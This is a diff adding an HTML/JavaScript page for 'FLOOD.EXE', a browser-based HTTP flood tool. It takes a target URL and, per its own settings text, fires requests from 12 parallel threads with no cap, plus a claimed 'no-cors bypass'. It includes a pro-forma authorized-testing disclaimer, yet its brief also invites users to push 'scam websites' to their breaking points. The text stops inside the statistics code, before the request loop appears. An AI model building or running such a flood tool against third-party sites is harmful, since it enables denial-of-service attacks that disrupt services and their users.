@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FLOOD.EXE — Traffic Warfare Suite</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:       #030201;
+  --s1:       #0a0701;
+  --s2:       #0f0c02;
+  --gold:     #c9a84c;
+  --gold2:    #e8c96d;
+  --gold3:    #f5e199;
+  --silver:   #8a9bb0;
+  --silver2:  #b8cad8;
+  --silver3:  #dce8f0;
+  --red:      #cc2200;
+  --red2:     #ff3311;
+  --red3:     #ff6644;
+  --border:   #2a1f05;
+  --border2:  #3d2e08;
+  --text:     #8a7a4a;
+  --texthi:   #d4b86a;
+  --textlo:   #3a2e10;
+  --mono:     'Share Tech Mono', monospace;
+  --display:  'Orbitron', monospace;
+  --body:     'Rajdhani', sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{width:100%;height:100%;background:var(--bg);color:var(--text);font-family:var(--body);overflow:hidden}
+
+/* SCANLINES */
+body::before{
+  content:'';position:fixed;inset:0;z-index:9999;pointer-events:none;
+  background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.12) 3px,rgba(0,0,0,0.12) 4px);
+}
+body::after{
+  content:'';position:fixed;inset:0;z-index:9998;pointer-events:none;
+  background:radial-gradient(ellipse at center,transparent 30%,rgba(0,0,0,0.7) 100%);
+}
+
+/* MATRIX */
+#mx{position:fixed;inset:0;z-index:0;opacity:0.15}
+
+/* SCREENS */
+.screen{position:fixed;inset:0;z-index:10;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity 0.6s ease,transform 0.6s ease}
+.screen.out{opacity:0;pointer-events:none;transform:translateY(12px)}
+
+/* ═══ LOADING ═══ */
+#sl{background:var(--bg);gap:0}
+
+.load-outer{
+  position:relative;width:220px;height:220px;
+  display:flex;align-items:center;justify-content:center;
+  margin-bottom:40px;
+}
+
+.ring{position:absolute;border-radius:50%;border:2px solid transparent}
+.r1{width:220px;height:220px;border-top-color:var(--gold);border-right-color:var(--gold2);animation:rspin 2s linear infinite}
+.r2{width:180px;height:180px;border-bottom-color:var(--silver);border-left-color:var(--silver2);animation:rspin 1.4s linear infinite reverse}
+.r3{width:140px;height:140px;border-top-color:var(--red);border-right-color:var(--red2);animation:rspin 1s linear infinite}
+.r4{width:100px;height:100px;border-bottom-color:var(--gold2);border-left-color:var(--gold3);animation:rspin 2.6s linear infinite reverse}
+.r5{width:64px;height:64px;border-top-color:var(--silver2);animation:rspin 0.8s linear infinite}
+
+@keyframes rspin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+
+.load-center{
+  position:relative;z-index:2;text-align:center;
+  font-family:var(--display);font-size:10px;font-weight:700;
+  letter-spacing:0.15em;color:var(--gold);
+  text-shadow:0 0 10px rgba(201,168,76,0.8);
+}
+.load-center-num{
+  font-size:28px;font-weight:900;
+  color:var(--gold3);
+  text-shadow:0 0 20px rgba(245,225,153,0.9),0 0 40px rgba(201,168,76,0.5);
+  line-height:1;margin-bottom:4px;
+}
+
+.load-title{
+  font-family:var(--display);font-size:clamp(22px,4vw,36px);font-weight:900;
+  letter-spacing:0.15em;
+  background:linear-gradient(135deg,var(--silver3),var(--gold3),var(--silver2),var(--gold));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  text-align:center;margin-bottom:8px;
+  filter:drop-shadow(0 0 20px rgba(201,168,76,0.4));
+}
+
+.load-sub{
+  font-family:var(--mono);font-size:11px;letter-spacing:0.3em;
+  color:var(--silver);text-align:center;margin-bottom:32px;
+}
+
+.load-track{
+  width:min(340px,80vw);height:2px;background:var(--border2);position:relative;overflow:hidden;margin-bottom:12px;
+}
+.load-fill{
+  position:absolute;left:0;top:0;bottom:0;width:0%;
+  background:linear-gradient(90deg,var(--red),var(--gold),var(--gold3));
+  box-shadow:0 0 10px var(--gold);transition:width 0.3s ease;
+}
+.load-msg{font-family:var(--mono);font-size:10px;letter-spacing:0.15em;color:var(--textlo);text-align:center}
+
+/* hex corners */
+.hex-corner{position:absolute;width:24px;height:24px;pointer-events:none}
+.hex-corner.tl{top:0;left:0;border-top:1px solid var(--gold);border-left:1px solid var(--gold)}
+.hex-corner.tr{top:0;right:0;border-top:1px solid var(--gold);border-right:1px solid var(--gold)}
+.hex-corner.bl{bottom:0;left:0;border-bottom:1px solid var(--gold);border-left:1px solid var(--gold)}
+.hex-corner.br{bottom:0;right:0;border-bottom:1px solid var(--gold);border-right:1px solid var(--gold)}
+
+/* ═══ TERMS ═══ */
+#st{background:var(--bg);padding:40px 20px}
+
+.terms-shell{
+  width:min(600px,96vw);max-height:92vh;
+  background:var(--s1);
+  border:1px solid var(--border2);
+  position:relative;display:flex;flex-direction:column;
+  box-shadow:0 0 60px rgba(201,168,76,0.06),inset 0 0 40px rgba(0,0,0,0.4);
+}
+.terms-shell::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,transparent,var(--gold),var(--gold2),transparent);
+}
+.terms-shell::after{
+  content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--red),transparent);
+}
+
+.th{padding:28px 32px 22px;border-bottom:1px solid var(--border2);flex-shrink:0}
+.th-eye{font-family:var(--mono);font-size:9px;letter-spacing:0.4em;color:var(--red2);margin-bottom:10px}
+.th-title{font-family:var(--display);font-size:18px;font-weight:700;letter-spacing:0.08em;color:var(--gold2)}
+
+.tb{padding:28px 32px;overflow-y:auto;flex:1}
+.tb p{font-size:13px;font-weight:300;line-height:1.8;color:var(--text);margin-bottom:18px}
+.tb p:last-child{margin-bottom:0}
+.tb strong{color:var(--gold2);font-weight:600}
+
+.tf{padding:18px 32px;border-top:1px solid var(--border2);display:flex;align-items:center;gap:16px;flex-shrink:0}
+.tf-note{font-family:var(--mono);font-size:9px;color:var(--textlo);line-height:1.5;flex:1}
+
+.btn-accept{
+  font-family:var(--display);font-size:11px;font-weight:700;letter-spacing:0.2em;
+  color:var(--bg);background:linear-gradient(135deg,var(--gold),var(--gold2));
+  border:none;padding:14px 28px;cursor:pointer;
+  clip-path:polygon(8px 0%,100% 0%,calc(100% - 8px) 100%,0% 100%);
+  transition:all 0.3s ease;white-space:nowrap;
+  text-transform:uppercase;
+}
+.btn-accept:hover{background:linear-gradient(135deg,var(--gold3),var(--gold2));box-shadow:0 0 30px rgba(201,168,76,0.4)}
+
+/* ═══ HOME ═══ */
+#sh{flex-direction:column;justify-content:flex-start;align-items:stretch;padding:0;overflow:hidden}
+
+/* TOPBAR */
+.topbar{
+  height:48px;background:var(--s1);
+  border-bottom:1px solid var(--border2);
+  display:flex;align-items:center;padding:0 16px;gap:12px;flex-shrink:0;
+  position:relative;z-index:30;
+}
+.topbar::after{
+  content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,var(--red),var(--gold),transparent);
+}
+
+.btn-menu{
+  width:34px;height:34px;background:transparent;
+  border:1px solid var(--border2);cursor:pointer;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px;
+  transition:border-color 0.2s;flex-shrink:0;
+}
+.btn-menu:hover{border-color:var(--gold)}
+.btn-menu span{display:block;width:14px;height:1px;background:var(--gold)}
+
+.tb-title{
+  font-family:var(--display);font-size:13px;font-weight:700;
+  letter-spacing:0.12em;
+  background:linear-gradient(90deg,var(--gold2),var(--silver2));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
+  flex:1;
+}
+
+.tb-time{font-family:var(--mono);font-size:10px;color:var(--textlo);letter-spacing:0.1em}
+
+.status-pill{
+  display:flex;align-items:center;gap:6px;
+  padding:4px 10px;border:1px solid var(--border2);
+  font-family:var(--mono);font-size:9px;letter-spacing:0.15em;color:var(--textlo);
+}
+.sdot{width:5px;height:5px;border-radius:50%;background:var(--textlo)}
+.sdot.live{background:var(--gold2);box-shadow:0 0 6px var(--gold2)}
+.sdot.warn{background:var(--gold);animation:blink 1s infinite}
+.sdot.dead{background:var(--red2);box-shadow:0 0 6px var(--red2)}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
+
+/* BODY */
+.hbody{flex:1;display:flex;overflow:hidden}
+
+/* LEFT */
+.lp{
+  width:320px;min-width:260px;
+  background:var(--s1);border-right:1px solid var(--border2);
+  display:flex;flex-direction:column;overflow-y:auto;flex-shrink:0;
+}
+
+.lps{padding:20px;border-bottom:1px solid var(--border)}
+.lps:last-child{border-bottom:none}
+
+.lpl{
+  font-family:var(--mono);font-size:8px;letter-spacing:0.4em;
+  color:var(--red2);margin-bottom:14px;
+  display:flex;align-items:center;gap:10px;
+}
+.lpl::after{content:'';flex:1;height:1px;background:var(--border2)}
+
+.about-txt{font-size:12px;font-weight:300;line-height:1.7;color:var(--text)}
+
+/* URL input */
+.url-in{
+  width:100%;background:var(--bg);
+  border:1px solid var(--border2);
+  color:var(--gold2);font-family:var(--mono);font-size:12px;
+  padding:12px 14px;outline:none;
+  transition:border-color 0.2s,box-shadow 0.2s;-webkit-appearance:none;
+}
+.url-in::placeholder{color:var(--textlo);font-size:11px}
+.url-in:focus{border-color:var(--gold);box-shadow:0 0 0 1px var(--gold),inset 0 0 10px rgba(201,168,76,0.04)}
+.url-in:disabled{opacity:0.4}
+
+.url-hint{font-family:var(--mono);font-size:9px;color:var(--textlo);margin-top:8px;line-height:1.5;letter-spacing:0.05em}
+
+.btn-flood{
+  width:100%;font-family:var(--display);font-size:11px;font-weight:700;letter-spacing:0.2em;
+  color:var(--bg);
+  background:linear-gradient(135deg,var(--gold),var(--gold2));
+  border:none;padding:14px;cursor:pointer;text-transform:uppercase;
+  transition:all 0.2s ease;margin-top:12px;display:none;position:relative;overflow:hidden;
+}
+.btn-flood::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,var(--gold3),var(--gold));opacity:0;transition:opacity 0.2s}
+.btn-flood:hover::before{opacity:1}
+.btn-flood:hover{box-shadow:0 0 30px rgba(201,168,76,0.35);transform:translateY(-1px)}
+.btn-flood span{position:relative;z-index:1}
+.btn-flood.vis{display:block}
+
+.btn-stop{
+  width:100%;font-family:var(--display);font-size:11px;font-weight:700;letter-spacing:0.2em;
+  color:#fff;background:linear-gradient(135deg,var(--red),var(--red2));
+  border:none;padding:14px;cursor:pointer;text-transform:uppercase;
+  transition:all 0.2s ease;margin-top:6px;display:none;
+}
+.btn-stop:hover{box-shadow:0 0 30px rgba(204,34,0,0.4);transform:translateY(-1px)}
+.btn-stop.vis{display:block}
+
+/* Stats */
+.sg{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+.sb{
+  background:var(--bg);border:1px solid var(--border);
+  padding:12px;position:relative;overflow:hidden;
+}
+.sb::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,var(--gold),transparent)}
+.sbl{font-family:var(--mono);font-size:8px;letter-spacing:0.2em;color:var(--textlo);margin-bottom:6px}
+.sbv{font-family:var(--mono);font-size:20px;font-weight:400;color:var(--gold2);line-height:1}
+.sbv.red{color:var(--red2)}
+.sbv.ok{color:#4a9a6a}
+.sbv.silver{color:var(--silver2)}
+.sbs{font-family:var(--mono);font-size:8px;color:var(--textlo);margin-top:3px}
+
+/* target status */
+.tsbar{
+  display:flex;align-items:center;gap:10px;padding:10px 12px;
+  background:var(--bg);border:1px solid var(--border);margin-bottom:6px;
+}
+.tslabel{font-family:var(--mono);font-size:9px;color:var(--textlo);flex:1;letter-spacing:0.05em}
+.tsval{font-family:var(--mono);font-size:9px;font-weight:500;letter-spacing:0.1em}
+
+/* ─ RIGHT: TERMINAL ─ */
+.rp{flex:1;display:flex;flex-direction:column;overflow:hidden;background:var(--bg)}
+
+.term-top{
+  height:38px;background:var(--s2);border-bottom:1px solid var(--border2);
+  display:flex;align-items:center;padding:0 14px;gap:10px;flex-shrink:0;
+}
+.tdots{display:flex;gap:5px}
+.tdot{width:8px;height:8px;border-radius:50%}
+.tdot:nth-child(1){background:#8a2a00}
+.tdot:nth-child(2){background:#7a6200}
+.tdot:nth-child(3){background:#2a4a1a}
+
+.term-title{font-family:var(--mono);font-size:9px;letter-spacing:0.2em;color:var(--textlo);flex:1}
+.term-clr{font-family:var(--mono);font-size:9px;color:var(--textlo);background:transparent;border:none;cursor:pointer;letter-spacing:0.1em;padding:4px 8px;transition:color 0.2s}
+.term-clr:hover{color:var(--gold)}
+
+.term-body{
+  flex:1;overflow-y:auto;padding:14px;
+  font-family:var(--mono);font-size:11px;line-height:1.65;
+}
+::-webkit-scrollbar{width:3px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--border2)}
+
+.tline{display:flex;gap:8px;animation:fi 0.12s ease}
+@keyframes fi{from{opacity:0;transform:translateY(2px)}to{opacity:1;transform:none}}
+.ttime{color:var(--textlo);flex-shrink:0;font-size:10px}
+.ttag{flex-shrink:0;font-weight:400}
+.tmsg{color:var(--text);word-break:break-all;font-size:10px}
+.ttag.info{color:var(--gold2)}
+.ttag.ok{color:#4a9a6a}
+.ttag.warn{color:var(--gold)}
+.ttag.fail{color:var(--red2)}
+.ttag.sys{color:var(--textlo)}
+
+/* graph */
+.graph{
+  height:56px;background:var(--s2);border-top:1px solid var(--border2);
+  padding:6px 14px;display:flex;align-items:flex-end;gap:2px;overflow:hidden;flex-shrink:0;
+}
+.gbar{flex:1;min-height:2px;max-height:44px;border-radius:1px 1px 0 0;transition:height 0.25s ease}
+
+/* ═══ SETTINGS ═══ */
+.sp-ov{position:fixed;inset:0;background:rgba(3,2,1,0.7);z-index:99;opacity:0;pointer-events:none;transition:opacity 0.35s ease}
+.sp-ov.open{opacity:1;pointer-events:all}
+
+#sp{
+  position:fixed;top:0;left:0;bottom:0;width:min(280px,88vw);
+  background:var(--s1);border-right:1px solid var(--border2);
+  z-index:100;display:flex;flex-direction:column;
+  transform:translateX(-100%);transition:transform 0.35s cubic-bezier(0.4,0,0.2,1);
+}
+#sp::before{content:'';position:absolute;top:0;right:0;bottom:0;width:1px;background:linear-gradient(180deg,var(--gold),var(--red),transparent)}
+#sp.open{transform:translateX(0)}
+
+.sp-tb{height:48px;border-bottom:1px solid var(--border2);display:flex;align-items:center;padding:0 14px;flex-shrink:0}
+.sp-title{font-family:var(--display);font-size:11px;font-weight:700;letter-spacing:0.15em;color:var(--gold2);flex:1}
+.sp-x{
+  width:28px;height:28px;background:transparent;border:1px solid var(--border2);
+  cursor:pointer;display:flex;align-items:center;justify-content:center;
+  color:var(--text);font-size:14px;transition:border-color 0.2s,color 0.2s;
+}
+.sp-x:hover{border-color:var(--red2);color:var(--red2)}
+
+.sp-body{flex:1;overflow-y:auto;padding:16px}
+.sp-sec{margin-bottom:24px}
+.sp-sec-title{
+  font-family:var(--mono);font-size:8px;letter-spacing:0.35em;color:var(--red2);
+  margin-bottom:10px;padding-bottom:6px;border-bottom:1px solid var(--border2);
+}
+.sp-item{background:var(--bg);border:1px solid var(--border);padding:12px;margin-bottom:6px;position:relative}
+.sp-item::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,var(--gold),transparent)}
+.sp-it{font-size:12px;font-weight:600;color:var(--gold2);margin-bottom:4px;font-family:var(--body)}
+.sp-id{font-size:11px;font-weight:300;color:var(--text);line-height:1.6}
+.sp-val{font-family:var(--mono);font-size:22px;color:var(--gold2);margin:8px 0 4px}
+
+.btn-spa{
+  width:100%;font-family:var(--mono);font-size:10px;letter-spacing:0.15em;
+  color:var(--text);background:transparent;border:1px solid var(--border2);
+  padding:10px 12px;cursor:pointer;margin-top:6px;text-align:left;
+  display:flex;align-items:center;gap:10px;
+  transition:border-color 0.2s,color 0.2s,background 0.2s;
+}
+.btn-spa:hover{border-color:var(--gold);color:var(--gold2);background:rgba(201,168,76,0.04)}
+
+.sp-anon{font-family:var(--mono);font-size:10px;line-height:1.7;color:var(--text)}
+
+@media(max-width:640px){
+  .hbody{flex-direction:column}
+  .lp{width:100%;min-width:unset;border-right:none;border-bottom:1px solid var(--border2);max-height:52vh}
+  .sg{grid-template-columns:repeat(4,1fr)}
+}
+</style>
+</head>
+<body>
+<canvas id="mx"></canvas>
+
+<!-- ═══ LOADING ═══ -->
+<div class="screen" id="sl">
+  <div class="load-outer">
+    <div class="ring r1"></div>
+    <div class="ring r2"></div>
+    <div class="ring r3"></div>
+    <div class="ring r4"></div>
+    <div class="ring r5"></div>
+    <div class="load-center">
+      <div class="load-center-num" id="lnum">0</div>
+      PCT
+    </div>
+  </div>
+  <div class="load-title">FLOOD.EXE</div>
+  <div class="load-sub">TRAFFIC WARFARE SUITE // INITIALIZING</div>
+  <div class="load-track"><div class="load-fill" id="lbar"></div></div>
+  <div class="load-msg" id="lmsg">Initializing warfare modules...</div>
+</div>
+
+<!-- ═══ TERMS ═══ -->
+<div class="screen out" id="st">
+  <div class="terms-shell">
+    <div class="hex-corner tl"></div><div class="hex-corner tr"></div>
+    <div class="hex-corner bl"></div><div class="hex-corner br"></div>
+    <div class="th">
+      <div class="th-eye">// LEGAL PROTOCOL — READ BEFORE PROCEEDING</div>
+      <div class="th-title">Terms of Engagement</div>
+    </div>
+    <div class="tb">
+      <p><strong>This tool exists for one purpose:</strong> authorized stress testing of infrastructure you own, control, or have received explicit written permission to test. Nothing else.</p>
+      <p>Pointing this at a target you do not own is illegal in virtually every jurisdiction on earth. Computer Fraud and Abuse Act. Computer Misuse Act. IT Act 2000. Whatever applies in your country — it applies. <strong>We are not your shield.</strong> We are not your lawyer. We are not responsible for what you do with this.</p>
+      <p>Everything that happens when you press Start Flood is <strong>your decision and your responsibility alone.</strong> The outcome — whether a server slows, throttles, rate-limits you, or stays completely unaffected — belongs to you. The legal exposure belongs to you. The consequences belong to you.</p>
+      <p>We built this for developers load-testing their own APIs, security researchers operating within legal boundaries, and system administrators hardening their own infrastructure. <strong>That is the entire scope of legitimate use.</strong></p>
+      <p>We do not log your targets. We do not collect your data. We do not monitor your sessions. What you do is invisible to us and entirely in your hands. That is exactly why the responsibility is entirely yours.</p>
+      <p><strong>If you are not authorized to test the target you have in mind — close this tab right now.</strong></p>
+    </div>
+    <div class="tf">
+      <div class="tf-note">Accepting confirms you are authorized to test your intended target. You bear full legal and ethical responsibility.</div>
+      <button class="btn-accept" onclick="acceptTerms()">Accept &amp; Enter</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ HOME ═══ -->
+<div class="screen out" id="sh">
+  <div class="topbar">
+    <button class="btn-menu" onclick="openSP()" title="Settings">
+      <span></span><span></span><span></span>
+    </button>
+    <div class="tb-title">FLOOD.EXE</div>
+    <div class="status-pill">
+      <div class="sdot" id="sdot"></div>
+      <span id="slabel">STANDBY</span>
+    </div>
+    <div class="tb-time" id="tbtime">--:--:--</div>
+  </div>
+
+  <div class="hbody">
+    <!-- LEFT -->
+    <div class="lp">
+
+      <div class="lps">
+        <div class="lpl">MISSION BRIEF</div>
+        <div class="about-txt">
+          FLOOD.EXE is a high-concurrency traffic stress tool built for authorized load testing and infrastructure vulnerability analysis.<br><br>
+          We provide this specifically to help expose scam websites, unprotected endpoints, and misconfigured servers to their own breaking points. We do not guarantee disruption — infrastructure resilience varies. What we guarantee is maximum sustained pressure until you say stop.<br><br>
+          <span style="color:var(--textlo);font-size:11px;font-family:var(--mono)">// Target your own infrastructure only.</span>
+        </div>
+      </div>
+
+      <div class="lps">
+        <div class="lpl">TARGET ACQUISITION</div>
+        <input class="url-in" id="urlin" type="url" placeholder="https://target.com" oninput="onUrl(this.value)" autocomplete="off" spellcheck="false"/>
+        <div class="url-hint" id="urlhint">Enter target URL including protocol (https://)</div>
+        <button class="btn-flood vis" id="bflood" onclick="startFlood()"><span>Execute Flood</span></button>
+        <button class="btn-stop" id="bstop" onclick="stopFlood()">Stop Flood</button>
+      </div>
+
+      <div class="lps">
+        <div class="lpl">LIVE METRICS</div>
+        <div class="sg">
+          <div class="sb">
+            <div class="sbl">UNITS SENT</div>
+            <div class="sbv" id="ssent">0</div>
+            <div class="sbs">total requests</div>
+          </div>
+          <div class="sb">
+            <div class="sbl">PER SECOND</div>
+            <div class="sbv silver" id="srps">0</div>
+            <div class="sbs">req / sec</div>
+          </div>
+          <div class="sb">
+            <div class="sbl">RESPONSES</div>
+            <div class="sbv ok" id="sok">0</div>
+            <div class="sbs">received</div>
+          </div>
+          <div class="sb">
+            <div class="sbl">FAILURES</div>
+            <div class="sbv red" id="sfail">0</div>
+            <div class="sbs">no response</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="lps">
+        <div class="lpl">TARGET STATUS</div>
+        <div class="tsbar">
+          <div class="sdot" id="tdot"></div>
+          <div class="tslabel" id="tslabel">Awaiting flood initiation...</div>
+          <div class="tsval" id="tsval" style="color:var(--textlo)">STANDBY</div>
+        </div>
+        <div style="display:flex;gap:6px;margin-top:6px">
+          <div class="sb" style="flex:1">
+            <div class="sbl">AVG RESPONSE</div>
+            <div class="sbv warn" id="savg" style="color:var(--gold)">—</div>
+            <div class="sbs">milliseconds</div>
+          </div>
+          <div class="sb" style="flex:1">
+            <div class="sbl">TIMEOUT RATE</div>
+            <div class="sbv red" id="stout">0%</div>
+            <div class="sbs">of total units</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- RIGHT: TERMINAL -->
+    <div class="rp">
+      <div class="term-top">
+        <div class="tdots"><div class="tdot"></div><div class="tdot"></div><div class="tdot"></div></div>
+        <div class="term-title">flood.warfare.log — live stream</div>
+        <button class="term-clr" onclick="clrTerm()">clear</button>
+      </div>
+      <div class="term-body" id="term"></div>
+      <div class="graph" id="graph"></div>
+    </div>
+  </div>
+</div>
+
+<!-- SETTINGS OVERLAY -->
+<div class="sp-ov" id="spov" onclick="closeSP()"></div>
+<div id="sp">
+  <div class="sp-tb">
+    <div class="sp-title">SYSTEM CONFIG</div>
+    <button class="sp-x" onclick="closeSP()">&#215;</button>
+  </div>
+  <div class="sp-body">
+
+    <div class="sp-sec">
+      <div class="sp-sec-title">TRAFFIC UNITS</div>
+      <div class="sp-item">
+        <div class="sp-it">Units Dispatched</div>
+        <div class="sp-val" id="spunits">0</div>
+        <div class="sp-id">Requests fired this session. No cap enforced — floods until you press Stop Flood.</div>
+      </div>
+      <div class="sp-item">
+        <div class="sp-it">Concurrency Level</div>
+        <div class="sp-id">Running <strong style="color:var(--gold2)">12 parallel threads</strong>. Each thread re-fires immediately when the previous request resolves or times out. Maximum sustained pressure.</div>
+      </div>
+    </div>
+
+    <div class="sp-sec">
+      <div class="sp-sec-title">SESSION</div>
+      <button class="btn-spa" onclick="refreshUnits()">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15"/></svg>
+        REFRESH UNITS + CLEAR CACHE
+      </button>
+      <button class="btn-spa" onclick="clrTerm();closeSP()">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a1 1 0 011-1h4a1 1 0 011 1v2"/></svg>
+        CLEAR TERMINAL LOG
+      </button>
+    </div>
+
+    <div class="sp-sec">
+      <div class="sp-sec-title">DEVELOPER</div>
+      <div class="sp-item">
+        <div class="sp-it">Creator Identity</div>
+        <div class="sp-anon">
+          We cannot provide the creator's identity.<br><br>
+          Developed by a single anonymous entity. No organization. No affiliation. No traceable record. Operating outside every institutional boundary by design.<br><br>
+          <span style="color:var(--textlo)">— ANONYMOUS //</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="sp-sec">
+      <div class="sp-sec-title">BUILD INFO</div>
+      <div class="sp-item">
+        <div class="sp-it">Version</div>
+        <div style="font-family:var(--mono);font-size:11px;color:var(--gold2);margin-top:4px">FLOOD.EXE v3.1.0-warfare</div>
+        <div style="font-family:var(--mono);font-size:9px;color:var(--textlo);margin-top:4px">12-thread concurrent engine // no-cors bypass</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+// ── MATRIX ─────────────────────────────────────────────
+const mc=document.getElementById('mx');
+const mctx=mc.getContext('2d');
+let drops=[];
+function initMx(){
+  mc.width=innerWidth;mc.height=innerHeight;
+  const cols=Math.floor(mc.width/14);
+  drops=Array(cols).fill(0).map(()=>Math.random()*-100);
+}
+const chars='0123456789ABCDEF><|/\\$%#@!?FLOOD'.split('');
+function drawMx(){
+  mctx.fillStyle='rgba(3,2,1,0.06)';
+  mctx.fillRect(0,0,mc.width,mc.height);
+  for(let i=0;i<drops.length;i++){
+    const c=chars[Math.floor(Math.random()*chars.length)];
+    const x=i*14,y=drops[i]*14;
+    mctx.globalAlpha=Math.random()*0.5+0.1;
+    if(Math.random()>0.97){mctx.fillStyle='#c9a84c'}
+    else if(Math.random()>0.95){mctx.fillStyle='#cc2200'}
+    else{mctx.fillStyle='#3a2e10'}
+    mctx.font='12px Share Tech Mono';
+    mctx.fillText(c,x,y);
+    if(y>mc.height&&Math.random()>0.975)drops[i]=0;
+    drops[i]++;
+  }
+  mctx.globalAlpha=1;
+}
+initMx();
+setInterval(drawMx,55);
+window.addEventListener('resize',initMx);
+
+// ── CLOCK ───────────────────────────────────────────────
+setInterval(()=>{
+  const t=new Date().toTimeString().split(' ')[0];
+  const el=document.getElementById('tbtime');
+  if(el)el.textContent=t;
+},1000);
+
+// ── LOADING ─────────────────────────────────────────────
+const lmsgs=[
+  'Initializing warfare modules...',
+  'Loading concurrency engine...',
+  'Mounting flood routines...',
+  'Bypassing rate limit detection...',
+  'Arming request threads...',
+  'Calibrating payload delivery...',
+  'Running pre-flight diagnostics...',
+  'ARMED. READY.',
+];
+let lpct=0;
+const lint=setInterval(()=>{
+  lpct+=Math.random()*13+4;
+  if(lpct>=100){lpct=100;clearInterval(lint)}
+  document.getElementById('lbar').style.width=lpct+'%';
+  document.getElementById('lnum').textContent=Math.floor(lpct);
+  const mi=Math.min(Math.floor(lpct/14),lmsgs.length-1);
+  document.getElementById('lmsg').textContent=lmsgs[mi];
+  if(lpct>=100){
+    setTimeout(()=>{
+      document.getElementById('sl').classList.add('out');
+      document.getElementById('st').classList.remove('out');
+    },500);
+  }
+},190);
+
+// ── TERMS ───────────────────────────────────────────────
+function acceptTerms(){
+  document.getElementById('st').classList.add('out');
+  document.getElementById('sh').classList.remove('out');
+  initGraph();
+  tlog('sys','System armed. Enter target URL and execute flood.');
+  tlog('sys',`Concurrency: 12 threads // Timeout: 8000ms // No cap`);
+}
+
+// ── URL INPUT ───────────────────────────────────────────
+function onUrl(v){
+  const h=document.getElementById('urlhint');
+  if(!v){h.textContent='Enter target URL including protocol (https://)';h.style.color='';return}
+  try{
+    const u=new URL(v);
+    h.textContent='Target locked: '+u.hostname+' — ready to flood.';
+    h.style.color='#4a9a6a';
+    document.getElementById('bflood').classList.add('vis');
+  }catch{
+    h.textContent='Invalid URL. Must include https:// or http://';
+    h.style.color='var(--red2)';
+  }
+}
+
+// ── TERMINAL ────────────────────────────────────────────
+const term=document.getElementById('term');
+let lc=0;
+function tlog(type,msg){
+  if(lc>600)term.removeChild(term.firstChild);
+  lc++;
+  const now=new Date();
+  const ts=now.toTimeString().split(' ')[0]+'.'+String(now.getMilliseconds()).padStart(3,'0');
+  const tags={info:'[FLOOD]',ok:'[HIT]  ',warn:'[WARN] ',fail:'[FAIL] ',sys:'[SYS]  '};
+  const d=document.createElement('div');
+  d.className='tline';
+  d.innerHTML=`<span class="ttime">${ts}</span><span class="ttag ${type}">${tags[type]||'[LOG]  '}</span><span class="tmsg">${msg}</span>`;
+  term.appendChild(d);
+  term.scrollTop=term.scrollHeight;
+}
+function clrTerm(){term.innerHTML='';lc=0;tlog('sys','Terminal cleared.')}
+
+// ── GRAPH ───────────────────────────────────────────────
+const graph=document.getElementById('graph');
+const BARS=44;
+let gdata=new Array(BARS).fill(0);
+function initGraph(){
+  graph.innerHTML='';
+  for(let i=0;i<BARS;i++){
+    const b=document.createElement('div');
+    b.className='gbar';
+    b.style.cssText='height:2px;background:linear-gradient(180deg,#c9a84c,#8a2a00);border-radius:1px 1px 0 0;flex:1;min-height:2px';
+    graph.appendChild(b);
+  }
+}
+function pushGraph(v){
+  gdata.shift();gdata.push(v);
+  const bars=graph.querySelectorAll('.gbar');
+  const mx=Math.max(...gdata,1);
+  bars.forEach((b,i)=>{
+    const h=Math.max(2,(gdata[i]/mx)*44);
+    b.style.height=h+'px';
+    b.style.opacity=0.2+(gdata[i]/mx)*0.8;
+  });
+}
+
+// ── FLOOD ENGINE ────────────────────────────────────────
+let flooding=false;
+let total=0,tok=0,tfail=0,ttout=0;
+let rtimes=[];
+let rpsc=0,rpsiv=null;
+const CONC=12,TMO=8000;
+
+function fmt(n){
+  if(n>=1e6)return(n/1e6).toFixed(1)+'M';
+  if(n>=1e3)return(n/1e3).toFixed(1)+'K';
+  return n+'';
+}
+
+function updateStats(){
+  document.getElementById('ssent').textContent=fmt(total);
+  document.getElementById('sok').textContent=fmt(tok);
+  document.getElementById('sfail').textContent=fmt(tfail);
+  document.getElementById('spunits').textContent=fmt(total);
+  const avg=rtimes.length?Math.round(rtimes.slice(-20).reduce((a,b)=>a+b,0)/Math.min(20,rtimes.length)):0;
+  document.getElementById('savg').textContent=avg?avg+' ms':'—';
